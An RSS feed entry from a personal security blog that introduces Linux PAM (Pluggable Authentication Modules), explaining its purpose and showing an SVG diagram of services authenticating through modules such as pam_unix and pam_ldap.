<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Security on Connected</title>
    <link>https://ayedaemon.github.io/tags/security/</link>
    <description>Recent content in Security on Connected</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 27 Dec 2022 23:25:23 +0530</lastBuildDate><atom:link href="https://ayedaemon.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Pluggable Authentication Modules - Linux</title>
      <link>https://ayedaemon.github.io/post/2022/12/pluggable-authentication-modules-linux/</link>
      <pubDate>Tue, 27 Dec 2022 23:25:23 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2022/12/pluggable-authentication-modules-linux/</guid>
      <description>Linux-PAM is a system of libraries that handle the authentication tasks of applications (services) on the system.</description>
      <content:encoded><![CDATA[<h2 id="pam---what-and-why">PAM - What and Why</h2>
<p>Authenticating a user to a service used to be a time-consuming process. The application had to be aware of all possible authentication mechanisms and had to be rebuilt every time a new authentication method was introduced&hellip; As a result, there was a significant amount of code repetition. Naturally, it was disliked by everyone!!</p>
<p>As a result, the concept of a middle-ware application responsible for user authentication to a service arose. And, Pluggable Authentication Modules (PAM), a collection of modules that act as a barrier between a service on your system and the service&rsquo;s user, were created.</p>
<p>Modules can include a variety of functions, such as disabling login for specific users/groups, limiting resources, audting, and so on. PAM is now supported by the vast majority of major unix flavours, including AIX, HP-US, FreeBSD, and nearly all Linux distributions.</p>
<p>The big advantage here is that security is no longer a concern for the application: if PAM says &ldquo;it&rsquo;s OK&rdquo;, it&rsquo;s OK. That simplifies things for both the application developer and the system administrator.</p>
<h2 id="understanding-pam">Understanding PAM</h2>
<p>According to <code>man (8) pam</code>,</p>
<blockquote>
<p>Linux-PAM is a system of libraries that handle the authentication tasks of applications (services) on the system. The library provides a stable general interface (Application Programming Interface - API) that privilege granting programs (such as login(1) and su(1)) defer to to perform standard authentication tasks.</p>
</blockquote>
<p>These libraries are typically configurable via defined arguments or dedicated configuration files. Internal behavior of the Linux-pam library is trivial from the standpoint of a sysadmin. The key point is to define the relationship between applications and the PAM.</p>
<p>The below diagram gives an idea of how PAM works.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 760 553"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='104' y='260' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='104' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='104' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='112' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='452' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='120' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='484' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='128' y='516' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='128' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='144' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='404' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='436' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='484' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='516' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='436' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='152' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='484' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='516' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='484' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='160' y='516' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='160' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='168' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='168' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='196' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='176' y='516' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='176' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='184' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='184' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='192' y='516' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='192' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='100' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='484' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='200' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='200' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='516' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='208' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='100' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='216' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='216' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='452' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='248' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='452' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='248' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='264' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='272' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='280' y='372' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='280' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='436' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='280' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='500' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='288' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='296' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='500' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='296' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='356' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='304' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='500' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='304' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='312' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='500' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='312' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='320' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='344' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='344' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='344' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='360' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='452' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='360' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='368' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='368' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='376' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='384' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='392' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='392' y='372' fill='currentColor' style='font-size:1em'>─</text>
